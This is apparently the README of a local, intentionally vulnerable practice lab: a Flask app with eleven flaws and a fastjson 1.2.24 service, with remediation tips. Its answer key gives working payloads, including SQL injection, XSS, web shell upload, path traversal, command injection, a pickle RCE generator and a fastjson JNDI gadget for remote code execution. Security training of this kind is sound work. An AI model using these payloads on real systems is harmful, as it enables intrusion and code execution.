# 本地安全靶场 (VulnLab)-README

# 本地安全靶场 (VulnLab)

两个**故意存在漏洞**的本地靶点，只监听 `127.0.0.1:8080`。用于练习：

| 靶点 | 端口 | 技术栈 | 覆盖 |
| --- | --- | --- | --- |
| **VulnPortal** | 8080 | Python/Flask | 未授权数据泄露、SQLi、SSRF、XSS(反射+存储)、任意文件上传、路径穿越、命令注入、不安全反序列化(pickle)、信息泄露 |
| **FastjsonTarget** | 8081 | Java 8 + fastjson **1.2.24** | fastjson autoType 反序列化 → JNDI 注入 / RCE |

> ⚠️ 仅本地练习。切勿把这两个服务监听到 `0.0.0.0` 或部署到公网。
> 

## 启动

```bash
# git-bash / MSYS 下
bash start_lab.sh
```

或分别手动启动：

```bash
# VulnPortal
.venv/Scripts/python.exe vulnportal/app.py          # -> http://127.0.0.1:8080/

# FastjsonTarget
cd fastjson-lab
"/c/Program Files/Java/jdk1.8.0_271/bin/java.exe" -cp "lib/fastjson-1.2.24.jar;." FastjsonTarget   # -> http://127.0.0.1:8081/
```

## 练习入口

- 漏洞清单(带每题入口和提示)：[**http://127.0.0.1:8080/__vulns__**](http://127.0.0.1:8080/__vulns__)
- fastjson 靶点说明：[**http://127.0.0.1:8081/**](http://127.0.0.1:8081/)

## 已知答案速查 (先自己试，卡住再看)

### VulnPortal

| # | 漏洞 | 复现 |
| --- | --- | --- |
| V1 | 未授权泄露/IDOR | `curl http://127.0.0.1:8080/api/user/1` → 泄露身份证/薪资/APIKey；`/api/export/all` 一次拖全库 |
| V2 | 登录 SQLi 绕过 | `curl -d "username=admin' -- &password=x" http://127.0.0.1:8080/login` → 302 进入后台 |
| V3 | SQL 注入 | `curl "http://127.0.0.1:8080/search?kw=' UNION SELECT 1,password,3,4 FROM users-- "` |
| V4 | SSRF | `curl "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8080/config"` → 读出密钥 |
| V5 | 反射 XSS | `curl "http://127.0.0.1:8080/hello?name=<script>alert(1)</script>"` |
| V6 | 存储 XSS | `curl -d 'msg=<img src=x onerror=alert(1)>' http://127.0.0.1:8080/guestbook` |
| V7 | 任意文件上传 | `curl -F file=@shell.php http://127.0.0.1:8080/upload` → `/static/uploads/shell.php` |
| V8 | 路径穿越 | `curl "http://127.0.0.1:8080/download?f=../../app.py"` → 读源码 |
| V9 | 命令注入 | `curl "http://127.0.0.1:8080/ping?host=127.0.0.1;whoami"` |
| V10 | 信息泄露 | `curl http://127.0.0.1:8080/config`；`/static/public/backup.tar.gz` 藏着 DB 口令 |
| V11 | pickle 反序列化 | 见下 |

V11 payload 生成：

```python
import base64,pickle,os
class E:
    def __reduce__(self): return (os.system,("calc.exe",))   # 换成任意命令
print(base64.b64encode(pickle.dumps(E())).decode())
```

```bash
curl -X POST --data "$(上面的输出)" http://127.0.0.1:8080/import
```

### FastjsonTarget

漏洞点：`POST /api/parse`（`JSON.parseObject(用户输入)`，autoType 默认开启）。
`POST /api/parsesafe` 是对照组（已关闭 autoType，同样 payload 无效）。

安全探测（判断是否 fastjson、是否开 autoType）：

```bash
curl -X POST -d '{"@type":"java.net.Inet4Address","val":"your-dns-log."}' http://127.0.0.1:8081/api/parse
```

RCE 链（JdbcRowSetImpl → JNDI）：

```bash
# 1) 起一个 LDAP/RMI 恶意服务 (如 marshalsec + 你的 LDAP server) 监听 3890
# 2) 发 gadget:
curl -X POST -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:3890/Exploit","autoCommit":true}' http://127.0.0.1:8081/api/parse
```

本仓库 `verify_fastjson.py` 用一个 TCP 监听器代替 LDAP 服务，直接验证 gadget 是否触发外连：

```bash
.venv/Scripts/python.exe fastjson-lab/verify_fastjson.py
```

## 修复方向 (练完对照)

- **VulnPortal**：接口加鉴权与对象级授权(防 IDOR)；全部改参数化查询；SSRF 白名单/禁内网；输出 HTML 转义；上传做后缀+内容+存储隔离且不可执行；路径用 `os.path.realpath` 校验在基目录内；命令用参数数组 + 白名单，去掉 `shell=True`；绝不对不可信数据用 `pickle`（改 JSON）；密钥进环境变量/密钥管理。
- **Fastjson**：升级到 1.2.83+ 并开启 safeMode；或换 Jackson；务必关闭 autoType 并对 `@type` 做白名单；JNDI 侧限制出网。

## 文件

```
targetlab/
├── .venv/                     # Python 环境 (flask)
├── vulnportal/app.py          # Flask 靶站 (11 个漏洞)
├── fastjson-lab/
│   ├── FastjsonTarget.java    # Java 靶点
│   ├── FastjsonTarget.class
│   ├── verify_fastjson.py     # fastjson 验证脚本
│   └── lib/fastjson-1.2.24.jar
└── start_lab.sh
```